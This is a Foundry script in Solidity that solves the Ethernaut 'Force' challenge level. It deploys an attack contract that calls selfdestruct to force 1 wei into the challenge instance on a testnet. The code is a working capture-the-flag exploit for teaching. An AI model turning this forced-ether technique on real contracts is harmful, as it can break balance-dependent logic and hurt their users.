// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Force} from "../src/Force.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Force.s.sol --tc ForceSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract ForceSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("FORCE_INSTANCE"));
    
    /* Attack idea: 
        Use the selfdestruct function to destroy the contract and send the remaining ether to the Force contract
        Notice that we will need to send some ether to the contract that will be destroyed 
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // create an instance of the attack contract with the Force instance address
        Attack attack = new Attack(instance);
        // call the attack function with some ether
        attack.attack{value: 1 wei}();
        vm.stopBroadcast();
    }
}

contract Attack {

    Force forceInstance;
    constructor(address _instance) {
        forceInstance = Force(_instance);
        
    }

    // We will send some ether when calling this function
    function attack() public payable {
        // cast to payable address
        address payable addr = payable(address(forceInstance));
        selfdestruct(addr);
    }
    
}